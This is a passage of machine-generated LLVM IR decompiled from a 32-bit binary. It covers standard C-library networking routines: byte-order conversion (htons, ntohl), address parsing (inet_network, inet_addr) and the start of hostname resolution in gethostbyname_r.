  %v3_8051d82 = inttoptr i32 %v2_8051d82 to i32*
  store i32 %tmp3, i32* %eax.global-to-local, align 4
  %v1_8051d89 = load i32, i32* @ebx, align 4
  %v2_8051d89 = add i32 %v1_8051d89, 12
  %v3_8051d89 = inttoptr i32 %v2_8051d89 to i32*
  store i32 %tmp3, i32* %v3_8051d89, align 4
  %v4_8051d8c = zext i8 %tmp to i32
  %v5_8051d8c = load i32, i32* %eax.global-to-local, align 4
  %v6_8051d8c = and i32 %v5_8051d8c, -256
  %v7_8051d8c = or i32 %v6_8051d8c, %v4_8051d8c
  store i32 %v7_8051d8c, i32* %eax.global-to-local, align 4
  %v2_8051d90 = load i32, i32* @ebx, align 4
  %v3_8051d90 = add i32 %v2_8051d90, 16
  %v4_8051d90 = inttoptr i32 %v3_8051d90 to i8*
  store i8 %tmp, i8* %v4_8051d90, align 1
  %v0_8051d93 = load i32, i32* %eax.global-to-local, align 4
  %v2_8051d96 = ptrtoint i32* %stack_var_-27 to i32
  %v0_8051d9b = load i32, i32* @ebx, align 4
  %v1_8051d9b = add i32 %v0_8051d9b, 17
  store i32 %v1_8051d9b, i32* %eax.global-to-local, align 4
  %v4_8051d9f = call i32 @__GI_mempcpy(i32 %v1_8051d9b, i32 %v2_8051d96, i32 19, i32 %v0_8051d93)
  store i32 %v4_8051d9f, i32* %eax.global-to-local, align 4
  %v3_8051dac = inttoptr i32 %v4_8051d9f to i8*
  %v4_8051dac = call i32 @__GI_memset(i8* %v3_8051dac, i32 0, i32 13)
  store i32 %v4_8051dac, i32* %eax.global-to-local, align 4
  %v0_8051db4.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8051db4

dec_label_pc_8051db4:                             ; preds = %entry, %dec_label_pc_8051d71
  %v0_8051db4 = phi i32 [ %v3_8051d63, %entry ], [ %v0_8051db4.pre, %dec_label_pc_8051d71 ]
  store i32 %v0_8051db4, i32* %eax.global-to-local, align 4
  %v2_8051db9 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8051db9, i32* @ebx, align 4
  store i32 %v0_8051d4c, i32* @esi, align 4
  ret i32 %v0_8051db4

; uselistorder directives
  uselistorder i32 %v0_8051db4, { 1, 0 }
  uselistorder i32 %v3_8051d63, { 0, 2, 1, 3 }
  uselistorder i32 %tmp3, { 1, 0 }
  uselistorder i8 %tmp, { 1, 0 }
  uselistorder label %dec_label_pc_8051db4, { 1, 0 }
}

define i32 @htons(i32 %arg1) local_unnamed_addr {
entry:
  %v1_8051dc0 = trunc i32 %arg1 to i16
  %v2_8051dc0 = call i16 @llvm.bswap.i16(i16 %v1_8051dc0)
  %v3_8051dc0 = zext i16 %v2_8051dc0 to i32
  ret i32 %v3_8051dc0
}

define i32 @htonl(i32 %arg1) local_unnamed_addr {
entry:
  %v1_8051dcc = call i32 @llvm.bswap.i32(i32 %arg1)
  ret i32 %v1_8051dcc
}

define i32 @ntohs(i32 %arg1) local_unnamed_addr {
entry:
  %v1_8051dd3 = trunc i32 %arg1 to i16
  %v2_8051dd3 = call i16 @llvm.bswap.i16(i16 %v1_8051dd3)
  %v3_8051dd3 = zext i16 %v2_8051dd3 to i32
  ret i32 %v3_8051dd3
}

define i32 @ntohl(i32 %arg1) local_unnamed_addr {
entry:
  %v1_8051ddf = call i32 @llvm.bswap.i32(i32 %arg1)
  ret i32 %v1_8051ddf
}

define i32 @inet_network(i8* %arg1) local_unnamed_addr {
entry:
  %v4_8051deb = ptrtoint i8* %arg1 to i32
  br label %dec_label_pc_8051dfe

dec_label_pc_8051dfe:                             ; preds = %dec_label_pc_8051ea6, %entry
  %v3_8051e8f = phi i32 [ 0, %entry ], [ %v5_8051e94, %dec_label_pc_8051ea6 ]
  %v2_8051e9d = phi i32 [ 0, %entry ], [ %v3_8051e9d, %dec_label_pc_8051ea6 ]
  %v0_8051e0c = phi i32 [ %v4_8051deb, %entry ], [ %v1_8051ea6, %dec_label_pc_8051ea6 ]
  %v1_8051dfe = inttoptr i32 %v0_8051e0c to i8*
  %v2_8051dfe = load i8, i8* %v1_8051dfe, align 1
  %v8_8051dfe = icmp eq i8 %v2_8051dfe, 48
  br i1 %v8_8051dfe, label %dec_label_pc_8051e0c, label %dec_label_pc_8051e03

dec_label_pc_8051e03:                             ; preds = %dec_label_pc_8051dfe
  br label %dec_label_pc_8051e2b

dec_label_pc_8051e0c:                             ; preds = %dec_label_pc_8051dfe
  %v1_8051e0c = add i32 %v0_8051e0c, 1
  %v1_8051e0d = inttoptr i32 %v1_8051e0c to i8*
  %v2_8051e0d = load i8, i8* %v1_8051e0d, align 1
  %v3_8051e0d = zext i8 %v2_8051e0d to i32
  %v4_8051e0d = load i32, i32* @eax, align 4
  %v5_8051e0d = and i32 %v4_8051e0d, -256
  %v6_8051e0d = or i32 %v5_8051e0d, %v3_8051e0d
  store i32 %v6_8051e0d, i32* @eax, align 4
  %v10_8051e0f = icmp eq i8 %v2_8051e0d, 120
  br i1 %v10_8051e0f, label %dec_label_pc_8051e23, label %dec_label_pc_8051e13

dec_label_pc_8051e13:                             ; preds = %dec_label_pc_8051e0c
  %v10_8051e13 = icmp eq i8 %v2_8051e0d, 88
  br i1 %v10_8051e13, label %dec_label_pc_8051e23, label %dec_label_pc_8051e17

dec_label_pc_8051e17:                             ; preds = %dec_label_pc_8051e13
  br label %dec_label_pc_8051e2b

dec_label_pc_8051e23:                             ; preds = %dec_label_pc_8051e13, %dec_label_pc_8051e0c
  %v1_8051e23 = add i32 %v0_8051e0c, 2
  br label %dec_label_pc_8051e2b

dec_label_pc_8051e2b:                             ; preds = %dec_label_pc_8051e17, %dec_label_pc_8051e03, %dec_label_pc_8051e23
  %v0_8051e7f4 = phi i32 [ %v1_8051e0c, %dec_label_pc_8051e17 ], [ %v0_8051e0c, %dec_label_pc_8051e03 ], [ %v1_8051e23, %dec_label_pc_8051e23 ]
  %v0_8051e8513 = phi i32 [ 1, %dec_label_pc_8051e17 ], [ 0, %dec_label_pc_8051e03 ], [ 0, %dec_label_pc_8051e23 ]
  %v0_8051e5410 = phi i32 [ 8, %dec_label_pc_8051e17 ], [ 10, %dec_label_pc_8051e03 ], [ 16, %dec_label_pc_8051e23 ]
  %v4_8051e7f.pre = load i32, i32* @edx, align 4
  %v1_8051e7f38 = inttoptr i32 %v0_8051e7f4 to i8*
  %v2_8051e7f39 = load i8, i8* %v1_8051e7f38, align 1
  %v3_8051e7f40 = zext i8 %v2_8051e7f39 to i32
  %v5_8051e7f41 = and i32 %v4_8051e7f.pre, -256
  %v6_8051e7f42 = or i32 %v3_8051e7f40, %v5_8051e7f41
  store i32 %v6_8051e7f42, i32* @edx, align 4
  %v4_8051e8143 = icmp eq i8 %v2_8051e7f39, 0
  %v1_8051e8344 = icmp eq i1 %v4_8051e8143, false
  br i1 %v1_8051e8344, label %dec_label_pc_8051e2f.lr.ph, label %dec_label_pc_8051e85

dec_label_pc_8051e2f.lr.ph:                       ; preds = %dec_label_pc_8051e2b
  %v6_8051e54 = icmp eq i32 %v0_8051e5410, 16
  %v1_8051e57 = icmp eq i1 %v6_8051e54, false
  %v9_8051e3f = icmp eq i32 %v0_8051e5410, 8
  %v1_8051e42 = icmp eq i1 %v9_8051e3f, false
  br label %dec_label_pc_8051e2f

dec_label_pc_8051e2f:                             ; preds = %dec_label_pc_8051e2f.lr.ph, %dec_label_pc_8051e79
  %v6_8051e7f50 = phi i32 [ %v6_8051e7f42, %dec_label_pc_8051e2f.lr.ph ], [ %v6_8051e7f, %dec_label_pc_8051e79 ]
  %v3_8051e7f49 = phi i32 [ %v3_8051e7f40, %dec_label_pc_8051e2f.lr.ph ], [ %v3_8051e7f, %dec_label_pc_8051e79 ]
  %v2_8051e7f48 = phi i8 [ %v2_8051e7f39, %dec_label_pc_8051e2f.lr.ph ], [ %v2_8051e7f, %dec_label_pc_8051e79 ]
  %v0_8051ea647 = phi i32 [ %v0_8051e7f4, %dec_label_pc_8051e2f.lr.ph ], [ %v1_8051e79, %dec_label_pc_8051e79 ]
  %v4_8051e9446 = phi i32 [ 0, %dec_label_pc_8051e2f.lr.ph ], [ %storemerge, %dec_label_pc_8051e79 ]
  %v0_8051e8545 = phi i32 [ %v0_8051e8513, %dec_label_pc_8051e2f.lr.ph ], [ 1, %dec_label_pc_8051e79 ]
  %v0_8051e32 = load i32, i32* @global_var_8062a20, align 32
  %v2_8051e37 = mul nuw nsw i32 %v3_8051e7f49, 2
  %v3_8051e37 = add i32 %v0_8051e32, %v2_8051e37
  %v4_8051e37 = inttoptr i32 %v3_8051e37 to i16*
  %v5_8051e37 = load i16, i16* %v4_8051e37, align 2
  %v6_8051e37 = zext i16 %v5_8051e37 to i32
  store i32 %v6_8051e37, i32* @eax, align 4
  %v2_8051e3b = and i16 %v5_8051e37, 8
  %v3_8051e3b = icmp eq i16 %v2_8051e3b, 0
  br i1 %v3_8051e3b, label %dec_label_pc_8051e54, label %dec_label_pc_8051e3f

dec_label_pc_8051e3f:                             ; preds = %dec_label_pc_8051e2f
  br i1 %v1_8051e42, label %dec_label_pc_8051e49, label %dec_label_pc_8051e44

dec_label_pc_8051e44:                             ; preds = %dec_label_pc_8051e3f
  %tmp91 = icmp ult i8 %v2_8051e7f48, 56
  br i1 %tmp91, label %dec_label_pc_8051e49, label %dec_label_pc_8051eb0

dec_label_pc_8051e49:                             ; preds = %dec_label_pc_8051e44, %dec_label_pc_8051e3f
  %v4_8051e4b = mul i32 %v4_8051e9446, %v0_8051e5410
  store i32 %v4_8051e4b, i32* @eax, align 4
  %v2_8051e4e = add i32 %v4_8051e4b, -48
  %v3_8051e4e = add i32 %v2_8051e4e, %v3_8051e7f49
  br label %dec_label_pc_8051e71

dec_label_pc_8051e54:                             ; preds = %dec_label_pc_8051e2f
  br i1 %v1_8051e57, label %dec_label_pc_8051e85, label %dec_label_pc_8051e59

dec_label_pc_8051e59:                             ; preds = %dec_label_pc_8051e54
  %v2_8051e59 = and i32 %v6_8051e37, 16
  %v3_8051e59 = icmp eq i32 %v2_8051e59, 0
  br i1 %v3_8051e59, label %dec_label_pc_8051e85, label %dec_label_pc_8051e5d

dec_label_pc_8051e5d:                             ; preds = %dec_label_pc_8051e59
  %v2_8051e67 = mul i32 %v4_8051e9446, 16
  store i32 0, i32* @eax, align 4
  %v3_8051e6d = add i32 %v2_8051e67, -87
  br label %dec_label_pc_8051e71

dec_label_pc_8051e71:                             ; preds = %dec_label_pc_8051e49, %dec_label_pc_8051e5d
  %v4_8051e7f6 = phi i32 [ %v6_8051e7f50, %dec_label_pc_8051e49 ], [ %v2_8051e67, %dec_label_pc_8051e5d ]
  %storemerge = phi i32 [ %v3_8051e4e, %dec_label_pc_8051e49 ], [ %v3_8051e6d, %dec_label_pc_8051e5d ]
  %tmp92 = icmp ult i32 %storemerge, 256
  br i1 %tmp92, label %dec_label_pc_8051e79, label %dec_label_pc_8051eb0

dec_label_pc_8051e79:                             ; preds = %dec_label_pc_8051e71
  %v1_8051e79 = add i32 %v0_8051ea647, 1
  %v1_8051e7f = inttoptr i32 %v1_8051e79 to i8*
  %v2_8051e7f = load i8, i8* %v1_8051e7f, align 1
  %v3_8051e7f = zext i8 %v2_8051e7f to i32
  %v5_8051e7f = and i32 %v4_8051e7f6, -256
  %v6_8051e7f = or i32 %v3_8051e7f, %v5_8051e7f
  store i32 %v6_8051e7f, i32* @edx, align 4
  %v4_8051e81 = icmp eq i8 %v2_8051e7f, 0
  %v1_8051e83 = icmp eq i1 %v4_8051e81, false
  br i1 %v1_8051e83, label %dec_label_pc_8051e2f, label %dec_label_pc_8051e85.thread

dec_label_pc_8051e85.thread:                      ; preds = %dec_label_pc_8051e79
  br label %dec_label_pc_8051e89

dec_label_pc_8051e85:                             ; preds = %dec_label_pc_8051e54, %dec_label_pc_8051e59, %dec_label_pc_8051e2b
  %v0_8051e85.lcssa = phi i32 [ %v0_8051e8513, %dec_label_pc_8051e2b ], [ %v0_8051e8545, %dec_label_pc_8051e59 ], [ %v0_8051e8545, %dec_label_pc_8051e54 ]
  %v4_8051e94.lcssa = phi i32 [ 0, %dec_label_pc_8051e2b ], [ %v4_8051e9446, %dec_label_pc_8051e59 ], [ %v4_8051e9446, %dec_label_pc_8051e54 ]
  %v0_8051ea6.lcssa = phi i32 [ %v0_8051e7f4, %dec_label_pc_8051e2b ], [ %v0_8051ea647, %dec_label_pc_8051e59 ], [ %v0_8051ea647, %dec_label_pc_8051e54 ]
  %v2_8051e7f.lcssa = phi i8 [ %v2_8051e7f39, %dec_label_pc_8051e2b ], [ %v2_8051e7f48, %dec_label_pc_8051e59 ], [ %v2_8051e7f48, %dec_label_pc_8051e54 ]
  %v4_8051e81.lcssa = phi i1 [ true, %dec_label_pc_8051e2b ], [ false, %dec_label_pc_8051e59 ], [ false, %dec_label_pc_8051e54 ]
  %v1_8051e85 = icmp eq i32 %v0_8051e85.lcssa, 0
  br i1 %v1_8051e85, label %dec_label_pc_8051eb0, label %dec_label_pc_8051e89

dec_label_pc_8051e89:                             ; preds = %dec_label_pc_8051e85.thread, %dec_label_pc_8051e85
  %v4_8051e81.lcssa90 = phi i1 [ true, %dec_label_pc_8051e85.thread ], [ %v4_8051e81.lcssa, %dec_label_pc_8051e85 ]
  %v2_8051e7f.lcssa89 = phi i8 [ %v2_8051e7f, %dec_label_pc_8051e85.thread ], [ %v2_8051e7f.lcssa, %dec_label_pc_8051e85 ]
  %v0_8051ea6.lcssa88 = phi i32 [ %v1_8051e79, %dec_label_pc_8051e85.thread ], [ %v0_8051ea6.lcssa, %dec_label_pc_8051e85 ]
  %v4_8051e94.lcssa87 = phi i32 [ %storemerge, %dec_label_pc_8051e85.thread ], [ %v4_8051e94.lcssa, %dec_label_pc_8051e85 ]
  %v3_8051e89 = icmp eq i32 %v2_8051e9d, 0
  br i1 %v3_8051e89, label %dec_label_pc_8051e94, label %dec_label_pc_8051e8f

dec_label_pc_8051e8f:                             ; preds = %dec_label_pc_8051e89
  %v5_8051e8f = mul i32 %v3_8051e8f, 256
  br label %dec_label_pc_8051e94

dec_label_pc_8051e94:                             ; preds = %dec_label_pc_8051e89, %dec_label_pc_8051e8f
  %v3_8051e94 = phi i32 [ %v3_8051e8f, %dec_label_pc_8051e89 ], [ %v5_8051e8f, %dec_label_pc_8051e8f ]
  %v5_8051e94 = or i32 %v3_8051e94, %v4_8051e94.lcssa87
  %v10_8051e98 = icmp eq i8 %v2_8051e7f.lcssa89, 46
  %v1_8051e9b = icmp eq i1 %v10_8051e98, false
  br i1 %v1_8051e9b, label %dec_label_pc_8051eac, label %dec_label_pc_8051e9d

dec_label_pc_8051e9d:                             ; preds = %dec_label_pc_8051e94
  %v11_8051ea0 = icmp eq i32 %v2_8051e9d, 3
  br i1 %v11_8051ea0, label %dec_label_pc_8051eb0, label %dec_label_pc_8051ea6

dec_label_pc_8051ea6:                             ; preds = %dec_label_pc_8051e9d
  %v3_8051e9d = add i32 %v2_8051e9d, 1
  %v1_8051ea6 = add i32 %v0_8051ea6.lcssa88, 1
  br label %dec_label_pc_8051dfe

dec_label_pc_8051eac:                             ; preds = %dec_label_pc_8051e94
  br i1 %v4_8051e81.lcssa90, label %dec_label_pc_8051eb8, label %dec_label_pc_8051eb0

dec_label_pc_8051eb0:                             ; preds = %dec_label_pc_8051e9d, %dec_label_pc_8051e85, %dec_label_pc_8051e71, %dec_label_pc_8051e44, %dec_label_pc_8051eac
  br label %dec_label_pc_8051eb8

dec_label_pc_8051eb8:                             ; preds = %dec_label_pc_8051eac, %dec_label_pc_8051eb0
  %v3_8051eb8 = phi i32 [ %v5_8051e94, %dec_label_pc_8051eac ], [ -1, %dec_label_pc_8051eb0 ]
  ret i32 %v3_8051eb8

; uselistorder directives
  uselistorder i32 %v5_8051e94, { 1, 0 }
  uselistorder i32 %v6_8051e7f, { 1, 0 }
  uselistorder i32 %v3_8051e7f, { 1, 0 }
  uselistorder i8 %v2_8051e7f, { 0, 2, 3, 1 }
  uselistorder i32 %storemerge, { 0, 2, 1 }
  uselistorder i32 %v4_8051e4b, { 1, 0 }
  uselistorder i32 %v4_8051e9446, { 2, 3, 1, 0 }
  uselistorder i32 %v0_8051e5410, { 0, 2, 1 }
  uselistorder i32 %v0_8051e0c, { 1, 0, 2, 3 }
  uselistorder i32 %v2_8051e9d, { 1, 0, 2 }
  uselistorder i32 %v3_8051e8f, { 1, 0 }
  uselistorder label %dec_label_pc_8051eb8, { 1, 0 }
  uselistorder label %dec_label_pc_8051eb0, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_8051e94, { 1, 0 }
  uselistorder label %dec_label_pc_8051e89, { 1, 0 }
  uselistorder label %dec_label_pc_8051e85, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8051e71, { 1, 0 }
  uselistorder label %dec_label_pc_8051e2f, { 1, 0 }
  uselistorder label %dec_label_pc_8051e2b, { 2, 0, 1 }
}

define i32 @inet_addr(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v2_8051ec7 = ptrtoint i32* %stack_var_-4 to i32
  %v2_8051ed0 = inttoptr i32 %arg1 to i8*
  %v3_8051ed0 = call i32 @inet_aton(i8* %v2_8051ed0, i32 %v2_8051ec7)
  store i32 -1, i32* @edx, align 4
  %v1_8051edb = icmp eq i32 %v3_8051ed0, 0
  br i1 %v1_8051edb, label %dec_label_pc_8051ee3, label %dec_label_pc_8051edf

dec_label_pc_8051edf:                             ; preds = %entry
  %v3_8051edf = load i32, i32* %stack_var_-4, align 4
  store i32 %v3_8051edf, i32* @edx, align 4
  br label %dec_label_pc_8051ee3

dec_label_pc_8051ee3:                             ; preds = %entry, %dec_label_pc_8051edf
  %v0_8051ee3 = phi i32 [ -1, %entry ], [ %v3_8051edf, %dec_label_pc_8051edf ]
  ret i32 %v0_8051ee3

; uselistorder directives
  uselistorder label %dec_label_pc_8051ee3, { 1, 0 }
}

define i32 @__GI_gethostbyname(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_8051eef = call i32 @__GI___h_errno_location()
  %v0_8051ef4 = load i32, i32* @edx, align 4
  %v2_8051ef7 = ptrtoint i32* %stack_var_-4 to i32
  %v9_8051f0f = call i32 @gethostbyname_r(i32 %arg1, i32* nonnull @global_var_806728c.232, i32 ptrtoint (i32* @global_var_80670c0.231 to i32), i32 460, i32 %v2_8051ef7, i32 %v0_8051eef, i32 %v0_8051ef4, i32 %v0_8051ef4)
  %v3_8051f14 = load i32, i32* %stack_var_-4, align 4
  ret i32 %v3_8051f14
}

define i32 @gethostbyname_r(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp10 = call i32 @__decompiler_undefined_function_0()
  %tmp11 = call i64 @__decompiler_undefined_function_2()
  %tmp18 = ptrtoint i32* %arg2 to i32
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-108 = alloca i32, align 4
  %stack_var_-92 = alloca i32, align 4
  %v0_8051f1c = load i32, i32* @ebp, align 4
  %v0_8051f1d = load i32, i32* @edi, align 4
  %v0_8051f1e = load i32, i32* @esi, align 4
  %v0_8051f1f = load i32, i32* @ebx, align 4
  store i32 %arg3, i32* @ebp, align 4
  store i32 %arg4, i32* @ebx, align 4
  %v1_8051f2f = inttoptr i32 %arg5 to i32*
  store i32 0, i32* %v1_8051f2f, align 4
  store i32 22, i32* %eax.global-to-local, align 4
  %v4_8051f3a = icmp eq i32 %arg1, 0
  br i1 %v4_8051f3a, label %dec_label_pc_8052246, label %dec_label_pc_8051f45

dec_label_pc_8051f45:                             ; preds = %entry
  %v1_8051f45 = call i32 @__errno_location(i32 %v0_8051f1f)
  store i32 %v1_8051f45, i32* %eax.global-to-local, align 4
  store i32 %v1_8051f45, i32* @esi, align 4
  %v1_8051f4c = inttoptr i32 %v1_8051f45 to i32*
  %v2_8051f4c = load i32, i32* %v1_8051f4c, align 4
  store i32 %v2_8051f4c, i32* @edi, align 4
  store i32 0, i32* %v1_8051f4c, align 4
  %v0_8051f5d = load i32, i32* @ebx, align 4
  store i32 %v0_8051f5d, i32* %stack_var_-108, align 4
  %v7_8051f69 = call i32 @__get_hosts_byname_r(i32 %arg1, i32 2, i32 %tmp18, i32 %v0_8051f5d, i32 %arg5, i32 %arg6, i32 %v1_8051f45)
  store i32 %v7_8051f69, i32* %eax.global-to-local, align 4
  %v1_8051f71 = icmp eq i32 %v7_8051f69, 0
  br i1 %v1_8051f71, label %dec_label_pc_8052246, label %dec_label_pc_8051f79

dec_label_pc_8051f79:                             ; preds = %dec_label_pc_8051f45
  store i32 %arg6, i32* @ecx, align 4
  %v1_8051f7d = inttoptr i32 %arg6 to i32*
  %v2_8051f7d = load i32, i32* %v1_8051f7d, align 4
  store i32 %v2_8051f7d, i32* %edx.global-to-local, align 4
  %v9_8051f7f = icmp eq i32 %v2_8051f7d, 1
  br i1 %v9_8051f7f, label %dec_label_pc_8051f99, label %dec_label_pc_8051f84

dec_label_pc_8051f84:                             ; preds = %dec_label_pc_8051f79
  %v9_8051f84 = icmp eq i32 %v2_8051f7d, 4
  br i1 %v9_8051f84, label %dec_label_pc_8051f99, label %dec_label_pc_8051f89

dec_label_pc_8051f89:                             ; preds = %dec_label_pc_8051f84
  %v1_8051f89 = add i32 %v2_8051f7d, 1
  %v8_8051f89 = icmp eq i32 %v1_8051f89, 0
  store i32 %v1_8051f89, i32* %edx.global-to-local, align 4
  %v1_8051f8a = icmp eq i1 %v8_8051f89, false
  br i1 %v1_8051f8a, label %dec_label_pc_8052246, label %dec_label_pc_8051f90

dec_label_pc_8051f90:                             ; preds = %dec_label_pc_8051f89
  %v0_8051f90 = load i32, i32* @esi, align 4
  %v1_8051f90 = inttoptr i32 %v0_8051f90 to i32*
  %v2_8051f90 = load i32, i32* %v1_8051f90, align 4
  %v11_8051f90 = icmp eq i32 %v2_8051f90, 2
  %v1_8051f93 = icmp eq i1 %v11_8051f90, false
  br i1 %v1_8051f93, label %dec_label_pc_8052246, label %dec_label_pc_8051f99

dec_label_pc_8051f99:                             ; preds = %dec_label_pc_8051f90, %dec_label_pc_8051f84, %dec_label_pc_8051f79
  %v0_8051f99 = load i32, i32* @ebp, align 4
  store i32 %v0_8051f99, i32* %eax.global-to-local, align 4
  %v0_8051f9b = load i32, i32* @edi, align 4
  %v1_8051f9b = load i32, i32* @esi, align 4
  %v2_8051f9b = inttoptr i32 %v1_8051f9b to i32*
  store i32 %v0_8051f9b, i32* %v2_8051f9b, align 4
  %v0_8051f9d = load i32, i32* %eax.global-to-local, align 4
  %v1_8051f9d = sub i32 0, %v0_8051f9d
  %v1_8051f9f = urem i32 %v1_8051f9d, 4
  %v2_8051f9f = icmp eq i32 %v1_8051f9f, 0
  store i32 %v1_8051f9f, i32* %eax.global-to-local, align 4
  %v0_8051fb4.pre = load i32, i32* @ebx, align 4
  br i1 %v2_8051f9f, label %dec_label_pc_8051fb0, label %dec_label_pc_8051fa4

dec_label_pc_8051fa4:                             ; preds = %dec_label_pc_8051f99
  %v2_8051fa4 = sub i32 %v0_8051fb4.pre, %v1_8051f9f
  %v7_8051fa4 = icmp ult i32 %v0_8051fb4.pre, %v1_8051f9f
  br i1 %v7_8051fa4, label %dec_label_pc_8052241, label %dec_label_pc_8051fac

dec_label_pc_8051fac:                             ; preds = %dec_label_pc_8051fa4
  %v0_8051fac = load i32, i32* @ebp, align 4
  %v2_8051fac = add i32 %v0_8051fac, %v1_8051f9f
  store i32 %v2_8051fac, i32* @ebp, align 4
  store i32 %v2_8051fa4, i32* @ebx, align 4
  br label %dec_label_pc_8051fb0

dec_label_pc_8051fb0:                             ; preds = %dec_label_pc_8051f99, %dec_label_pc_8051fac
  %v0_8051fb4 = phi i32 [ %v2_8051fa4, %dec_label_pc_8051fac ], [ %v0_8051fb4.pre, %dec_label_pc_8051f99 ]
  store i32 %arg6, i32* %eax.global-to-local, align 4
  store i32 -1, i32* %v1_8051f7d, align 4
  %tmp43 = icmp ult i32 %v0_8051fb4, 4
  br i1 %tmp43, label %dec_label_pc_8052241, label %dec_label_pc_8051fc3

dec_label_pc_8051fc3:                             ; preds = %dec_label_pc_8051fb0
  %v0_8051fc3 = load i32, i32* @ebx, align 4
  %v1_8051fc3 = add i32 %v0_8051fc3, -4
  store i32 %v1_8051fc3, i32* %eax.global-to-local, align 4
  %tmp44 = icmp ult i32 %v1_8051fc3, 8
  br i1 %tmp44, label %dec_label_pc_8052241, label %dec_label_pc_8051fcf

dec_label_pc_8051fcf:                             ; preds = %dec_label_pc_8051fc3
  %v0_8051fcf = load i32, i32* @ebp, align 4
  %v1_8051fcf = add i32 %v0_8051fcf, 4
  store i32 %v1_8051fcf, i32* %edx.global-to-local, align 4
  %v1_8051fd2 = add i32 %v0_8051fc3, -12
  store i32 %v1_8051fd2, i32* %eax.global-to-local, align 4
  store i32 %v1_8051fcf, i32* %stack_var_-92, align 4
  %v3_8051fdb = inttoptr i32 %v1_8051fcf to i32*
  store i32 %v0_8051fcf, i32* %v3_8051fdb, align 4
  %v0_8051fde = load i32, i32* %edx.global-to-local, align 4
  %v1_8051fde = add i32 %v0_8051fde, 4
  %v2_8051fde = inttoptr i32 %v1_8051fde to i32*
  store i32 0, i32* %v2_8051fde, align 4
  %tmp45 = icmp ult i32 %v1_8051fd2, 32
  br i1 %tmp45, label %dec_label_pc_8052241, label %dec_label_pc_8051feb

dec_label_pc_8051feb:                             ; preds = %dec_label_pc_8051fcf
  %v0_8051feb = load i32, i32* @ebx, align 4
  %v1_8051feb = add i32 %v0_8051feb, -44
  store i32 %v1_8051feb, i32* @ebx, align 4
  %tmp46 = icmp ult i32 %v1_8051feb, 256
  br i1 %tmp46, label %dec_label_pc_8052241, label %dec_label_pc_8051ffe

dec_label_pc_8051ffe:                             ; preds = %dec_label_pc_8051feb
  %v0_8051ffe = load i32, i32* @ebp, align 4
  %v1_8051ffe = add i32 %v0_8051ffe, 12
  %v1_8052001 = add i32 %v0_8051ffe, 44
  store i32 %v1_8052001, i32* @edi, align 4
  store i32 %v1_8052001, i32* %stack_var_-108, align 4
  %v3_8052012 = inttoptr i32 %v1_8052001 to i8*
  %v4_8052012 = call i32 @strncpy(i8* %v3_8052012, i32 %arg1, i32 %v1_8051feb)
  %v0_8052017 = load i32, i32* @edi, align 4
  %v1_8052017 = load i32, i32* @ebp, align 4
  %v2_8052017 = add i32 %v1_8052017, 12
  %v3_8052017 = inttoptr i32 %v2_8052017 to i32*
  store i32 %v0_8052017, i32* %v3_8052017, align 4
  %v1_805201e = add i32 %v0_8051ffe, 16
  %v2_805201e = inttoptr i32 %v1_805201e to i32*
  store i32 0, i32* %v2_805201e, align 4
  %v2_8052025 = load i32, i32* %stack_var_-108, align 4
  store i32 %v2_8052025, i32* %eax.global-to-local, align 4
  store i32 %arg1, i32* @edx, align 4
  %v0_8052027 = load i32, i32* @ebp, align 4
  store i32 %arg1, i32* %stack_var_-108, align 4
  %v2_805202c = inttoptr i32 %arg1 to i8*
  %v3_805202c = call i32 @inet_aton(i8* %v2_805202c, i32 %v0_8052027)
  store i32 %v3_805202c, i32* %eax.global-to-local, align 4
  %v1_8052034 = icmp eq i32 %v3_805202c, 0
  br i1 %v1_8052034, label %dec_label_pc_8052070, label %dec_label_pc_8052038

dec_label_pc_8052038:                             ; preds = %dec_label_pc_8051ffe
  store i32 %tmp18, i32* %edx.global-to-local, align 4
  %v0_805203c = load i32, i32* @edi, align 4
  store i32 %v0_805203c, i32* %arg2, align 4
  %v1_805203e = add i32 %tmp18, 8
  %v2_805203e = inttoptr i32 %v1_805203e to i32*
  store i32 2, i32* %v2_805203e, align 4
  %v0_8052045 = load i32, i32* %edx.global-to-local, align 4
  %v1_8052045 = add i32 %v0_8052045, 12
  %v2_8052045 = inttoptr i32 %v1_8052045 to i32*
  store i32 4, i32* %v2_8052045, align 4
  %v2_805204c = load i32, i32* %stack_var_-92, align 4
  %v1_805204f = load i32, i32* %edx.global-to-local, align 4
  %v2_805204f = add i32 %v1_805204f, 16
  %v3_805204f = inttoptr i32 %v2_805204f to i32*
  store i32 %v2_805204c, i32* %v3_805204f, align 4
  %v1_8052056 = load i32, i32* %edx.global-to-local, align 4
  %v2_8052056 = add i32 %v1_8052056, 4
  %v3_8052056 = inttoptr i32 %v2_8052056 to i32*
  store i32 %v1_8051ffe, i32* %v3_8052056, align 4
  store i32 %arg5, i32* @ecx, align 4
  %v0_805205d = load i32, i32* %edx.global-to-local, align 4
  store i32 %v0_805205d, i32* %v1_8051f2f, align 4
  store i32 0, i32* %v1_8051f7d, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052246

dec_label_pc_8052070:                             ; preds = %dec_label_pc_8051ffe
  %v0_8052070 = call i32 @__open_nameservers()
  store i32 %v0_8052070, i32* %eax.global-to-local, align 4
  %v2_8052080 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_8052080, i32* @ebx, align 4
  store i32 %v2_8052080, i32* %stack_var_-108, align 4
  %v4_8052085 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-36, i32 134540701, i32 ptrtoint (i32* @global_var_8062a48.233 to i32))
  store i32 %v4_8052085, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_8062a48.233 to i32), i32* %stack_var_-108, align 4
  %v1_8052091 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_8062a48.233 to i32))
